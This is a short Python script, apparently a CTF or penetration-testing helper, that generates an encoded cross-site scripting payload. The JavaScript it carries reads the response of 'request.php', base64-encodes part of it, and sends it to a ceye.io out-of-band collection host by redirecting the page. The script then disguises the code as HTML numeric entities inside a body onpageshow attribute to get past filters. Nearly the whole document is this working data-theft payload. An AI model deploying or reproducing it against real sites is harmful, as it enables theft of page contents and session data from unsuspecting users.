payload='''xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function()
{
    if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
        document.location='http://guui9d.ceye.io/'+btoa(xmlhttp.responseText.substr(0,500));
    }
}
xmlhttp.open('GET','request.php',true);
xmlhttp.send();'''
html_payload=""
for each in payload:
	html_payload=html_payload+"&#%d;"%ord(each)
print('<body/onpageshow="'+html_payload+'">')